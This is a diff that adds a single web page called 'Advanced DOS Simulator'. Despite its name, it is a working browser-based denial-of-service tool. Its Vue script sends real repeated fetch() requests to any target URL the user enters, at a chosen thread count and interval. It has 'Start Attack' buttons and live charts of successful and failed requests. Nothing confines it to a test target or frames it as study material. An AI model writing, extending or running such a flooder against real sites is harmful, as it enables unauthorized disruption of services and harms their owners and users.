@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced DOS Simulator</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Vue.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <!-- Chart.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body {
+            background-color: #0a0f0f;
+            color: #00ff00;
+        }
+        .btn-custom {
+            background-color: #00ff00;
+            color: #0a0f0f;
+        }
+        .btn-custom:hover {
+            background-color: #00cc00;
+        }
+        .card-custom {
+            background-color: #001f1f;
+            color: #00ff00;
+        }
+        .header, .footer {
+            background-color: #001b1b;
+            color: #00ff00;
+        }
+        .error {
+            color: #ff0000;
+        }
+        .log-entry {
+            background-color: #002020;
+            color: #00ff00;
+            padding: 0.5rem;
+            margin-bottom: 0.5rem;
+            border-radius: 0.25rem;
+        }
+        .log-container {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .input-custom {
+            background-color: #001f1f;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <header class="header p-6 text-center">
+        <h1 class="text-4xl font-bold">Advanced DOS Simulator</h1>
+    </header>
+    
+    <div id="app" class="container mx-auto p-6">
+        <div class="card card-custom shadow-xl w-full max-w-4xl mx-auto p-6">
+            <div class="card-body">
+                <h2 class="card-title text-2xl font-bold mb-4 text-center">Start Advanced Attack</h2>
+                <div v-if="errorMessage" class="error mb-4 text-center">
+                    <p>{{ errorMessage }}</p>
+                </div>
+                <div class="form-control mb-4">
+                    <label for="targetUrl" class="label text-lg">Target URL</label>
+                    <input type="text" id="targetUrl" v-model="targetUrl" class="input input-custom" placeholder="e.g., http://example.com">
+                </div>
+                <div class="form-control mb-4">
+                    <label for="threadCount" class="label text-lg">Thread Count</label>
+                    <input type="number" id="threadCount" v-model.number="threadCount" class="input input-custom" min="1">
+                </div>
+                <div class="form-control mb-4">
+                    <label for="interval" class="label text-lg">Request Interval (ms)</label>
+                    <input type="number" id="interval" v-model.number="interval" class="input input-custom" min="100">
+                </div>
+                <button @click="startAttack" class="btn btn-custom btn-block mb-2">Start Attack</button>
+                <button @click="stopAttack" v-if="attackRunning" class="btn btn-custom btn-block mb-2">Stop Attack</button>
+                <button @click="reset" class="btn btn-custom btn-block" v-if="!attackRunning">Reset</button>
+                
+                <div v-show="attackRunning" class="mt-6">
+                    <h3 class="text-xl font-bold mb-2">Attack Progress</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                        <div class="mb-4">
+                            <canvas id="progressChart"></canvas>
+                        </div>
+                        <div class="mb-4">
+                            <canvas id="successChart"></canvas>
+                        </div>
+                        <div class="mb-4">
+                            <canvas id="errorChart"></canvas>
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Logs</h3>
+                    <div class="log-container">
+                        <div v-for="(log, index) in logs" :key="index" class="log-entry">{{ log }}</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer p-4 text-center">
+        <p>© 2024 Advanced DOS Simulator. All Rights Reserved.</p>
+        <p>Developed by Quicksilver.</p>
+    </footer>
+    
+    <script>
+        new Vue({
+            el: '#app',
+            data() {
+                return {
+                    targetUrl: '',
+                    threadCount: 10,
+                    interval: 1000,
+                    attackRunning: false,
+                    successCount: 0,
+                    errorCount: 0,
+                    totalRequests: 0,
+                    errorMessage: '',
+                    logs: [],
+                    progressChart: null,
+                    successChart: null,
+                    errorChart: null
+                };
+            },
+            methods: {
+                startAttack() {
+                    if (!this.validateInputs()) return;
+                    
+                    this.attackRunning = true;
+                    this.successCount = 0;
+                    this.errorCount = 0;
+                    this.totalRequests = 0;
+                    this.logs = [];
+                    this.errorMessage = '';
+                    
+                    this.sendMessage("Attack started!");
+                    this.initializeCharts();
+                    this.runAttack();
+                },
+                stopAttack() {
+                    this.attackRunning = false;
+                    this.sendMessage("Attack stopped!");
+                },
+                reset() {
+                    this.stopAttack();
+                    this.targetUrl = '';
+                    this.threadCount = 10;
+                    this.interval = 1000;
+                    this.successCount = 0;
+                    this.errorCount = 0;
+                    this.totalRequests = 0;
+                    this.logs = [];
+                    this.errorMessage = '';
+                    this.initializeCharts();
+                },
+                validateInputs() {
+                    if (!this.targetUrl || !this.targetUrl.startsWith('http')) {
+                        this.errorMessage = 'Please enter a valid URL starting with "http".';
+                        return false;
+                    }
+                    if (this.threadCount <= 0) {
+                        this.errorMessage = 'Thread count must be greater than 0.';
+                        return false;
+                    }
+                    if (this.interval < 100) {
+                        this.errorMessage = 'Request interval must be at least 100 milliseconds.';
+                        return false;
+                    }
+                    return true;
+                },
+                sendMessage(message) {
+                    this.logs.push(message);
+                    if (this.logs.length > 100) {
+                        this.logs.shift(); // Keep log size manageable
+                    }
+                },
+                initializeCharts() {
+                    const ctxProgress = document.getElementById('progressChart').getContext('2d');
+                    this.progressChart = new Chart(ctxProgress, {
+                        type: 'line',
+                        data: {
+                            labels: [],
+                            datasets: [{
+                                label: 'Total Requests',
+                                data: [],
+                                borderColor: '#00ff00',
+                                backgroundColor: 'rgba(0, 255, 0, 0.1)',
+                                fill: true
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            scales: {
+                                x: {
+                                    type: 'linear',
+                                    position: 'bottom'
+                                }
+                            }
+                        }
+                    });
+
+                    const ctxSuccess = document.getElementById('successChart').getContext('2d');
+                    this.successChart = new Chart(ctxSuccess, {
+                        type: 'bar',
+                        data: {
+                            labels: ['Success'],
+                            datasets: [{
+                                label: 'Success Requests',
+                                data: [0],
+                                backgroundColor: '#00ff00'
+                            }]
+                        },
+                        options: {
+                            responsive: true
+                        }
+                    });
+
+                    const ctxError = document.getElementById('errorChart').getContext('2d');
+                    this.errorChart = new Chart(ctxError, {
+                        type: 'bar',
+                        data: {
+                            labels: ['Error'],
+                            datasets: [{
+                                label: 'Error Requests',
+                                data: [0],
+                                backgroundColor: '#ff0000'
+                            }]
+                        },
+                        options: {
+                            responsive: true
+                        }
+                    });
+                },
+                runAttack() {
+                    const intervalId = setInterval(() => {
+                        if (!this.attackRunning) {
+                            clearInterval(intervalId);
+                            return;
+                        }
+                        for (let i = 0; i < this.threadCount; i++) {
+                            setTimeout(() => {
+                                this.sendRequest();
+                            }, i * 100);
+                        }
+                    }, this.interval);
+                },
+                async sendRequest() {
+                    try {
+                        this.totalRequests++;
+                        const response = await fetch(this.targetUrl, { method: 'GET' });
+                        if (response.ok) {
+                            this.successCount++;
+                            this.sendMessage(`Request successful! Total: ${this.totalRequests}`);
+                        } else {
+                            this.errorCount++;
+                            this.sendMessage(`Error: ${response.status} ${response.statusText}`);
+                        }
+                    } catch (error) {
+                        this.errorCount++;
+                        this.sendMessage(`Network error: ${error.message}`);
+                    }
+                    this.updateCharts();
+                },
+                updateCharts() {
+                    if (this.progressChart) {
+                        const now = new Date().toLocaleTimeString();
+                        this.progressChart.data.labels.push(now);
+                        this.progressChart.data.datasets[0].data.push(this.totalRequests);
+                        this.progressChart.update();
+                    }
+                    if (this.successChart) {
+                        this.successChart.data.datasets[0].data[0] = this.successCount;
+                        this.successChart.update();
+                    }
+                    if (this.errorChart) {
+                        this.errorChart.data.datasets[0].data[0] = this.errorCount;
+                        this.errorChart.update();
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
